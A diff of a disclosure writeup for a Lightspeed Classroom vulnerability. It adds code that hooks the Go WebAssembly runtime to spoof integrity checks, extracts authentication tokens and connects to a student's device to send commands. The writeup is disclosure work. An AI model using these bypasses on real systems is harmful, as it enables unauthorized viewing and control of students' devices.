@@ -3,67 +3,483 @@ title: Lightspeed Classroom CVE-2026-30368 - Weak Authentication Allowing Unauth
 date: 2026-04-20
 ---
 
-**A vulnerability in Lightspeed Classroom, a browser extension installed on school-issued devices worldwide, allows an outside attacker to take control of a student’s device in real time. Three months after we reported it, it remains unfixed.**
+# Introduction
 
----
+Lightspeed Classroom is a popular browser extension used by thousands of schools worldwide, including at least 28 of the top 50 in the US, by cities as large as Los Angeles and Chicago, to keep track of students on school-issued devices in the classroom. It enables teachers to view, control, and manage what students see on their devices. This vulnerability allows an attacker to connect to a desired student’s school-issued device bearing the extension and perform actions meant to be done by teachers, such as sending URLs, closing tabs, and even locking screens of students. **An attacker requires only a target email address and district customer ID to initiate this remote control, without possessing Lightspeed credentials, elevated permissions, or physical access to the device.** Since the Chrome extension is limited to using username/email only to authenticate users, identity can easily be spoofed to authenticate as another person.
+
+The core issue is Lightspeed’s reliance on obfuscation to enforce integrity. They placed authentication code in an obfuscated WebAssembly file written in Go, which is notoriously difficult to reverse engineer. However, the file can be placed into a harness that mimics the real extension to extract authorization tokens and impersonate arbitrary users within the system. Obfuscation was also applied to worker.js, which includes most of the application’s code. The code is still navigable as long as you use any deobfuscator and unminifier website and have a decent editor that lets you view references.
+
+# Threat Model
+
+- Attacker is unauthenticated to the Lightspeed Classroom Portal
+- Attacker does not control district infrastructure
+- Attacker does not modify the victim’s device
+- Attacker does not possess Lightspeed-issued credentials
+- **Attacker requires only:**
+    - **student email address**
+    - **district customer ID**
+
+# The Extension
+
+LS Classroom comes packaged as a browser extension meant for provisioning to students.
+
+File structure:
+
+```json
+(root)
+├── assets
+│   ├── action-done.png
+│   ├── action-needhelp.png
+│   ├── action-unavailable.png
+│   ├── browseraction-working.png
+│   ├── icon-classroom-128.png
+│   ├── icon-classroom-16.png
+│   ├── icon-classroom-48.png
+│   ├── icon-r4tl-128.png
+│   ├── icon-r4tl-16.png
+│   ├── icon-r4tl-48.png
+│   ├── icon128.png
+│   ├── icon16.png
+│   ├── icon48.png
+│   ├── selected.svg
+│   ├── status-done.svg
+│   ├── status-needhelp.svg
+│   ├── status-pass.svg
+│   └── status-working.svg
+├── classroom.wasm
+├── classroom_license.txt
+├── content.js
+├── manifest.json
+├── menu.css
+├── menu.html
+├── menu.js
+├── offscreen.html
+├── options.html
+├── react.min.js
+├── rtc_connection.js
+└── worker.js
+```
+
+The Lightspeed Classroom extension uses [Ably](https://ably.io) for realtime communication from a controller (Lightspeed GUI or unauthorized device) to a student’s device (client). 
+
+The extension authenticates into Ably using a 3 part process:
+
+- Part 1: The Policy
+    - The worker (`worker.js`) makes a POST request to [`https://devices.classroom.relay.school/policy`](https://devices.classroom.relay.school/policy) with the user’s email in the JSON request body (for example: `{ username: "example@school.edu" }`). It also includes the `customerid`, `content-type`, `x-api-key`, and `version` headers. Any person who has taken a look at the Lightspeed extension will know where to find the values of `customerid` (specific to district). The `x-api-key` is Lightspeed’s Ably API key, which it also uses for the policy endpoint. The key is a constant across all Lightspeed customers. I will not reveal the value here, but if you have some technical skill, you should be able to find it pretty easily.
+    - The policy looks like this:
+    
+    ```jsx
+    {
+        "email": "student@school.edu",
+        "user_guid": "any-random-uuid",
+        "username": "student@school.edu",
+        "user_type": "student", // other values: staff
+        "groups": [{
+            "name": "Classroom",
+            "group_guid": "any-random-uuid",
+            "class_schedule": {
+                "12345": {
+                    "s": 8.10,
+                    "e": 14.55,
+                }
+            },
+            "schedule_type": "bell",
+            "enable_classroom": true,
+            "editable_schedules": ["ad_hoc", "bell", "custom"],
+            "bell_schedules": {
+                "isJson": true,
+                "value": "your-schools-bell-schedule-in-json-format"
+            },
+            "allowed_hours": {
+                "0": {},
+                "1": {
+                    "e": 18,
+                    "s": 7
+                },
+                "2": {
+                    "e": 18,
+                    "s": 7
+                },
+                "3": {
+                    "e": 18,
+                    "s": 7
+                },
+                "4": {
+                    "e": 18,
+                    "s": 7
+                },
+                "5": {
+                    "e": 18,
+                    "s": 7
+                },
+                "6": {}
+            },
+            "on_campus_only": true,
+            "adHocIsActive": false,
+            "hall_monitor": false
+        }],
+        "district": {
+            "campus_networks": ["1.2.3.4/16"],
+            "encrypted_customer_id": "a-12-byte-long-string",
+            "auto_close": 5000,
+            "tab_limit": 50,
+            "chromebook_only": true
+        },
+        "screen_lock_expire": -1,
+        "on_campus_only": true,
+        "jwt": "eyJ..."
+    }
+    ```
+    
+    - The values that really matter are as follows: `class_schedule`, `schedule_type`, `on_campus_only`, `campus_networks`, `tab_limit`, `chromebook_only`, and `jwt`.
+    - `class_schedule` contains the times that teachers are allowed to watch students. In reality, teachers can do everything except for view tabs and watch screens even outside of these times. During this time, a group is considered active.
+    - `schedule_type` dictates whether the schedule is a fixed bell schedule, or an adhoc schedule where a teacher can update it on the fly. Most secondary schools primarily use adhoc schedules while elementary schools use bell.
+    - `on_campus_only` is self explanatory. If true, Lightspeed will not even connect to Ably if the device’s IP (determined by making a request to [`https://devices.classroom.relay.school/ip`](https://devices.classroom.relay.school/ip)) is not inside one of the ranges inside `campus_networks`.
+    - `tab_limit` limits the number of tabs a student is allowed to open.
+    - `chromebook_only` dictates if only Chromebooks are allowed to connect to Lightspeed.
+    - `jwt` is a JSON web token that is eventually passed on later in the process. It includes the following payload:
+    
+    ```jsx
+    {
+    	cId: 'your-customer-id-A000',
+    	uEmail: 'student@school.edu',
+    }
+    ```
+    
+
+- Part 2: Getting the Ably Token
+    - This is the most complex phase and the phase where the vulnerability occurs.
+    - The `classroom.wasm` file is loaded by the worker, and calls the `LSClassroom.WASM.Setup` function with the Customer ID and version.
+    - The worker calls `LSClassroom.WASM.ConfigureClass` to define a class object that will hold a JWT that the WASM will generate later on.
+    - The worker then calls `LSClassroom.WASM.PolicyData` with the policy JWT, user email, and user GUID. These, along with some district specific information are used to create a signing key for the JWT.
+    - The worker calls `LSClassroom.WASM.GetIdent` with no arguments to kick off the process of generating the JWT.
+    - The JWT is generated completely in Go. It does not use any JS APIs that could potentially be intercepted or otherwise tampered with.
+    - After generating the JWT, the object passed to `ConfigureClass` receives the token in its `jwt` property. This is where the vulnerability captures the JWT (described in more detail later).
+- Part 3: Connecting to Ably
+    - The worker initiates the connection to Ably with the following code (deobfuscated and with variable names):
+    
+    ```jsx
+    new Ably.Realtime({
+      authHeaders: {
+        "Content-Type": "application/json",
+        "x-api-key": 'redacted',
+        jwt,
+        exp: 10
+      },
+      authUrl: 'https://ably.lightspeedsystems.app/',
+      clientId: email,
+      autoConnect: false,
+      echoMessages: true,
+      endpoint: "lightspeed",
+      fallbackHosts: ["a-fallback-lightspeed.ably.io", "b-fallback-lightspeed.ably.io", "c-fallback-lightspeed.ably.io"],
+    })
+    ```
+    
+    - The client must get the Ably JWT (different from the previous JWT that the WASM generated) from Lightspeed’s Ably auth servers. These auth servers were incorporated into Lightspeed after vulnerabilities exploited the ability to connect to any user from any Customer ID using just the API key and the key ID, the most notable use of these vulnerabilities being the [Lee County Incident](https://anon0mus-666.pages.dev/).
+    - The client makes a GET request to `https://ably.lightspeedsystems.app?clientId=student@school.edu&rnd=random_value_generated_by_ably` with the following headers:
+        - `jwt` - The JWT the WASM generated earlier
+        - `exp` - 10
+        - `x-api-key` - The Ably API key
+        - `content-type` - application/json
+    - The auth server returns the JWT token that is used to connect to Ably. This token only allows connections to ONE user. Previous vulnerabilities exploited the ability to connect to multiple channels on the same token (or using meta channels) but that has since been patched. If your JWT (the one in the request headers) is wrong, the server will return a 403.
+    - Finally, the client connects to the Ably channel tied to the user (the channel name is the customer ID, then a colon, followed by the user email. For example: `67-6741-A000:student@school.edu`).
+
+Now that the extension (or unauthorized device) has successfully connected to Ably, it can publish (send) or subscribe (listen for) messages sent in the channel. 
+
+`IsClassroomActive` is a conditional check widely used throughout the extension. It checks the following:
+
+- If `chromebook_only` is true in the policy, check if the user is on a Chromebook using `chrome.runtime.getPlatformInfo`, which is spoofed to return ChromeOS values in the vulnerability.
+- If `on_campus_only` is true in the policy, check if the user’s IP address is in one of the allowed ranges inside `campus_networks`.
+
+Lightspeed Classroom uses the following Ably messages:
+
+- `tabs` - Current tab data including currently focused tab. Published by the client every time a new user enters the Ably channel, or when a presence event is sent with `{"viewingTabs": true}` in the message data. Requires IsClassroomActive to be true and for the current time to be within the specified class schedule in the policy.
+    - Example
+        
+        ```jsx
+        {
+        	active: false,
+        	browser: 'Google Chrome',
+        	url: 'https://example.com',
+        	title: 'Example Domain',
+        	windowId: 123456789,
+        	id: 987654321,
+        	favico: 'https://example.com/favicon.ico',
+        	foreground: false,
+        }
+        ```
+        
+- `remoteDebug` - Prints a message to the debug console. Does not execute any arbitrary code.
+- `closeTab` - Closes a tab given its `id` and/or `url` obtained from the `tabs` message. Requires IsClassroomActive.
+    - Example
+        
+        ```jsx
+        {
+        	tabId: 987654321,
+        	url: 'https://example.com',
+        }
+        ```
+        
+- `focusTab` - Focuses a tab given its `id` and/or `window_id` obtained from the `tabs` message. Requires IsClassroomActive.
+    - Example
+        
+        ```jsx
+        {
+        	tabId: 987654321,
+        	windowId: 123456789,
+        }
+        ```
+        
+- `tm` - Sends a notification to the client. Requires IsClassroomActive.
+    - Example
+        
+        ```jsx
+        {
+        	mId: "any-random-uuid",
+        	m: "Test Notification",
+        }
+        ```
+        
+- `url` - Sends a URL to the client. Requires IsClassroomActive.
+    - Example
+        
+        ```jsx
+        channel.publish('url', 'https://example.com');
+        ```
+        
+- `lock` - Locks a client’s tabs with the specified `lockMessage` until optional `lockDuration`. Requires IsClassroomActive.
+    - Example
+        
+        ```jsx
+        {
+        	type: 'lock',
+        	lockMessage: 'Test Lock', // defaults to "Locked" client side
+        	lockedUntil: 2147483647, // we are not sure if this is a iso or unix date
+        }
+        ```
+        
+- `unlock` - Unlocks a client. Takes arguments but they are only relevant to Lightspeed’s hall pass system which we don’t know or care about. **Does NOT require IsClassroomActive**, probably to prevent teachers from locking students last period and forgetting about it.
+    - Example
+        
+        ```jsx
+        channel.publish('unlock');
+        ```
+        
+- `policyUpdate` - Refetches the policy from Lightspeed servers. Most likely used to update policy when adhoc schedules are made active. Only updates group settings, not district settings.
+- `setState` - Sets state of a hall pass. Requires IsClassroomActive. We have not had any experience with this function due to none of our schools using Lightspeed hall passes.
+- `startRecording` - Starts a recording. We really don’t know much about this.
+- `updateExtension` - Calls `chrome.runtime.requestUpdateCheck` to force an update of the extension.
+- `classpass` - Something to do with Lightspeed hall passes. Again, we don’t know much about this one.
+- `sendGroupUpdate` - We think this updates a group’s GUID but the obfuscated code is really hard to read and we’re not sure.
+- `request_rtc` - Starts the process of connecting to view the client’s screen via WebRTC. The callback function itself does not include any conditional checks. Those are done later in the RTC process. After receiving the message the function hands it off to `rtc_connection.js` using `chrome.runtime.sendMessage`.
+    - Example
+        
+        ```jsx
+        {
+        	sessionId: "any-random-uuid",
+        	role: 'viewer',
+        	want: ['video'],
+        }
+        ```
+        
+- `offer_rtc` - The next step in the RTC process. The client publishes this offer to the viewer/controller with ICE servers and SDP data.
+- `answer_rtc` and `answer_rtc_ice` - The final step in the RTC process that is handled on Ably. This is sent back to the client from the viewer’s browser. The function then hands it off to `rtc_connection.js`, which starts the WebRTC connection. The worker then checks for any active groups, and for IsClassroomActive to be true. It then starts sending frames from `chrome.tabs.captureVisibleTab` to `rtc_connection.js` every 2 seconds, which then processes it and broadcasts it to the WebRTC stream which can then be viewed. `answer_rtc_ice` coordinates ICE servers with the viewer.
+- `groupUpdate` - We know little about this message. We have intercepted it once before. From what we can tell, we think it sends additional browsing statistics to the viewer while the teacher is “inspecting” a student in the GUI. It is published by the client. We’re not really sure what triggers it.
+    - Example
+        
+        ```jsx
+        {
+        	"any-group-uuid": {
+        			agentType: "chrome",
+        			currentHost: "example.com",
+        			favico: "https://example.com/favicon.ico",
+        			visits: 67,
+        			top: "internet.com",
+        			topTime: 4167,
+        			insightHost: "internet.com",
+        			activeWindowTabUrl: "https://internet.com",
+        	}
+        }
+        ```
+        
+
+- The RTC
+    
+    When a teacher (or unauthorized third party) is attempting to view the student’s screen, messages are sent through Ably and eventually a peer to peer WebRTC connection is created. This connection is facilitated inside of `rtc_connection.js`. It is loaded on the `offscreen.html` background page. The extension uses `chrome.tabs.captureVisibleTab` to send frames to `rtc_connection.js` via Chrome’s messaging protocol to the viewer.
+    
+- The Validation
+    - The Lightspeed classroom WASM executes 4 validation checks before execution can continue. The checks are as follows:
+    - Check 1 verifies the extension’s `chrome.runtime.id`. As long as `key` is unchanged inside the manifest, this check will pass.
+    - Check 2 verifies the hash of `manifest.json`.
+    - Check 3 verifies the hash of `worker.js`. This is the first place where the vulnerability happens.
+    - Check 4 verifies the integrity of the `chrome.identity.getProfileUserInfo` function. If the function has been tampered with, which it would have to be with if the identity is being spoofed, the `.toString()` will return the contents of the function. This will trigger check 4 to fail. If the function is legitimate, the `.toString()` will return `function getProfileUserInfo() { [native code] }` which tells the WASM that the function has not been tampered with. This is another place where the vulnerability happens.
+
+# The Vulnerability
+
+The vulnerability aims to execute `worker.js` inside of a non-browser environment (such as Node.js) but for it to work as if it were inside a browser, then extract the JWT generated by the WASM and pass it back to the file that loads and executes the worker, and subsequently connect to Ably and expose opportunities for bad actors to perform unauthorized actions. This loader or “harness” needs to spoof almost every Chrome API for the worker to function properly. The loader we used in our initial testing of the vulnerability is at the bottom of the page.
+
+The vulnerability itself starts out in the validation checks before the extension starts up. In order to use a modified `worker.js` to extract the JWT to send to the auth server, validation check #3 (hash check of `worker.js`) needs to be bypassed. Importantly, the `worker.js` includes the Go runtime that facilitates communication between the WASM and the worker.
+
+During check 3, the WASM calls `chrome.extension.getURL('worker.js')` which retrieves the full URI that it has to fetch in order to access the worker and check its hash. In the Go runtime that is located in the worker, there is a function that handles the `js.valueCall` Go syscall. All function calls, including `getURL`, pass through this function to be processed. This is where the vulnerability happens. We can manipulate the function that handles `js.valueCall` to change the arguments passed to the `getURL` function (without modifying the WASM binary) to a different file path that includes a non-modified worker. This is done by calling two functions, one before the call is actually made inside of JS (by `Reflect.apply`), and one after, to manipulate its output. 
+
+Next, in check 4, the WASM calls `chrome.identity.getProfileUserInfo.toString()` to verify that the function has not been tampered with. The expected output is `function getProfileUserInfo() { [native code] }`. This can be manipulated in the exact same way as check 3. Once check 4 is successful, the WASM will trust the environment as a real student device and continue execution of the worker.
+
+Below is the modified `js.valueCall` handler, along with the functions called before and after the value is applied:
+
+```jsx
+"syscall/js.valueCall": function (sp) {
+  sp >>>= 0;
+  try {
+    var thisValue = loadValue(sp + 8);
+    var func = Reflect.get(thisValue, loadString(sp + 16));
+    var args = loadArgs(sp + 32);
+    args = valueCallBefore(args, args, func, thisValue);
+    var result = Reflect.apply(func, thisValue, args);
+    result = valueCallAfter(args, result, func, thisValue);
+    sp = wasmInstance.exports.getsp() >>> 0;
+    storeValue(sp + 56, result);
+    wasmMemory.setUint8(sp + 64, 1);
+  } catch (error) {
+    sp = wasmInstance.exports.getsp() >>> 0;
+    storeValue(sp + 56, error);
+    wasmMemory.setUint8(sp + 64, 0);
+  }
+}
+
+/////
+
+function valueCallBefore(args, before, func, r) {
+	// console.log(args, before, func, func.name, r)
+	const extUrlActualWorker = 'chrome-extension://EXT_ID/actualworker.js'
+	if (args[0] == "chrome-extension://EXT_ID/worker.js") {
+    return [extUrlActualWorker, args[1]];
+	}
+	if (func == chrome.identity.getProfileUserInfo) {
+	  console.log(identity)
+		args[1](identity)
+		return []
+	}
+	return before
+}
+
+/////
+
+function valueCallAfter(args, after, func, r) {
+	// console.log(func, args, r)
+	if (func.name == "toString"){
+		return 'function getProfileUserInfo() { [native code] }'
+	}
+	if (args[0] == "worker.js") {
+		return "chrome-extension://EXT_ID/actualworker.js"
+	}
+	if (args[0] == "[validation] pass") {
+	  console.log("validation passed")
+	}
+	return after
+}
+```
+
+The next step is to keep running the service worker until the JWT generated by the WASM can be extracted. Our implementation of the vulnerability extracts the JWT to a variable after the parameters for the Ably connection are defined. Once the loader detects that the JWT variable has been defined, it kills the worker to save processing power, authenticates with Ably, and connects or passes on the token to another file or web interface. Below is the JWT extraction code inside the worker:
+
+```jsx
+// Specific variable names in this snippet differ across builds
+_0x233583 = {
+  authHeaders: {
+    "Content-Type": "application/json",
+    "x-api-key": _0xdcbbd7("apiKey"),
+    jwt: _0xdcbbd7("ablyJwt"),
+    exp: 10
+  },
+  authUrl: _0xdcbbd7("ablyUrl"),
+  autoConnect: false,
+  clientId: _0xdcbbd7("email"),
+  echoMessages: false,
+  environment: "lightspeed",
+  fallbackHosts: _0x2affed,
+  recover: function (_0x3f76a3, _0x32fee0) {
+    _0x32fee0(true);
+  }
+};
+
+// The JWT is extracted here
+globalThis.__LIGHTSPEED_JWT__ = _0xdcbbd7("ablyJwt");
+```
+
+Finally, the loader can connect to a student’s Ably channel using the received token. The code below demonstrates how an unauthorized third-party can connect to a student’s computer and open a webpage on their device.
+
+```jsx
+const jwt = await runServiceWorker({ email, cId, });
+killServiceWorker();
+
+const realtime = new Ably.Realtime({
+  authHeaders: {
+    "Content-Type": "application/json",
+    "x-api-key": 'redacted',
+    jwt,
+    exp: 10
+  },
+  authUrl: 'https://ably.lightspeedsystems.app/',
+  clientId: email,
+  autoConnect: false,
+  echoMessages: true,
+  endpoint: "lightspeed",
+  fallbackHosts: ["a-fallback-lightspeed.ably.io", "b-fallback-lightspeed.ably.io", "c-fallback-lightspeed.ably.io"],
+});
+
+const channel = realtime.channels.get(`${cId}:${email}`)
+channel.publish('url', 'https://example.com');
+```
+
+An unauthorized third party can now perform any standard Lightspeed Classroom action on the student’s device, including sending URLs, closing tabs, locking and unlocking them, viewing their screen, and sending notifications. This becomes very dangerous and a serious breach to the privacy of students given the level of access granted by Lightspeed Classroom. While mass actions cannot be directly performed, an unauthorized third party can still iterate through a list of students to target given a decently powerful computer.
 
 <div className='flex justify-center items-center'>
-
 ![02-img1.png](./02-img1.png)
-
 </div>
+*Fig. 1: Demonstration of control over a Lightspeed classroom client.*
 
-## Introduction
+# Impact Summary and Root Cause
 
-Lightspeed Classroom is a widely used classroom management tool provisioned to over 23 million student devices and, according to their website, used by 28 of the top 50 school districts in the United States. It is used by educators to monitor student activity, open websites, close tabs, send messages, and control the websites they visit. 
+This vulnerability enables unauthorized third parties to impersonate legitimate users within Lightspeed Classroom and gain real time control over student devices. An attacker does not need physical access, administrative credentials, or any elevated privileges. Knowledge of a student’s email and district Customer ID is all it takes to initiate an attack.
 
----
+The impact includes, but is not limited to:
 
-## Impact
+- Unauthorized screen viewing via WebRTC
+- Forced opening of arbitrary URLs
+- Tab closure and focus manipulation
+- Screen locking and unlocking
+- Delivery of arbitrary notifications to students
 
-An attacker with no connection to a school, no credentials, and no physical access to a device can:
+These actions can be performed remotely, at scale, and can cause severe destructive effects in educational institutions using Lightspeed Classroom.
 
-- **View student screens** **in real time**
-- **Lock a student’s screen** during class, during an exam, at any time
-- **Force any website to open** on a student’s device
-- **Close tabs and disrupt browsing** on a student’s device
-- **Send messages and notifications** directly to students
+The root cause of this vulnerability is reliance on integrity of client-side code and security through obscurity via obfuscation for authentication and integrity checks. Identity verification, environment validation, and token generation are all executed fully client-side and relying on obfuscated JavaScript and WebAssembly rather than server-side verification.
 
----
+Specifically:
 
-## What Does an Attacker Need?
+- Identity is established through values that can be manipulated by the user
+- Integrity checks rely on JavaScript APIs that can be spoofed or intercepted
+- The WebAssembly runtime assumes the environment is legitimate once superficial validation checks pass
+- Authorization tokens generated client-side are trusted by backend services
 
-The only info an attacker needs it their target’s school email address, and a customer ID issued to their school district by Lightspeed, neither of which are hard to obtain.
+As a result, an emulation of a browser environment is treated as a legitimate student device.
 
----
+# Attempted Mitigations
 
-## How Did This Happen?
+Lightspeed has been informed of the vulnerability by at least 1 school district since January 22nd, 2026.
 
-Lightspeed built the software assuming that a serious attack would never happen. The checks that verify whether a user is who they claim to be happen on the user’s own device, meaning they can be bypassed entirely. There is effectively no secure authentication. The company also relied on making their code painful to read as a substitute for actual security, a practice known as security through obscurity which is widely regarded as unsafe on its own.
+As of April 20th, 2026, a patch for the issue has not been pushed, and everything documented here still works. 
 
----
+# TL;DR
 
-## Mitigation Status
+Lightspeed Classroom can be run outside of a browser by an unauthorized actor by bypassing validation checks by manipulating the WebAssembly runtime inside of the service worker. This leads to them being able to obtain authorization tokens for any user from any district that uses Lightspeed Classroom, and in turn, being able to perform actions on student devices that are normally reserved for teachers or administrators for usage to manage student browsing. The attacker does not need any info except for the email and customer ID of their target.
 
-The vulnerability was discovered and responsibly reported to Lightspeed by us in late January of 2026. Shortly after, Lightspeed filed a DMCA takedown to remove our original disclosure, despite it containing no copyrighted code or materials belonging to Lightspeed.
+# Conclusion and Final Notes
 
-As of April 20th, 2026, no patch has been released. The vulnerability is still active.
+This vulnerability demonstrates that obfuscation and client-side enforcement are insufficient safeguards for systems that exercise real control over user devices. When authentication tokens and authorization decisions can be from an emulated environment, trust boundaries collapse.
 
----
+Given the worldwide scale at which Lightspeed Classroom is deployed, the implications extend beyond individual misuse and represent a systemic risk to student privacy and safety. Addressing this issue requires architectural changes rather than incremental patches. Lastly, it is important to mention that this report intentionally omits automation tooling and fully operational exploit chains.
 
-## What Should Schools Do?
+# Credits
 
-Schools and districts using Lightspeed Classroom or other Lightspeed products should:
-
-- Monitor student devices for any unauthorized activity
-- Listen seriously to reports from students about any unexpected behavior on their devices
-- Demand a timeline from Lightspeed for a fix
-- Evaluate whether continued use of Lightspeed products is appropriate until the issue is resolved
-
----
-
-## Credit
-
-Discovered and documented by [**truekas**](https://github.com/truekas) and [**incognitotgt**](https://incognitotgt.me).
-
-*This report intentionally omits technical details that could be used to reproduce the attack. Researchers confirmed the vulnerability through controlled testing on personal devices. A recorded demonstration is available to credentialed journalists and security professionals upon request.*
+- Discovery & proof of concept: [truekas](https://github.com/truekas)
+- Web Interface & initial testing: [incognitotgt](https://incognitotgt.me)
+- Writeup: [truekas](https://github.com/truekas)
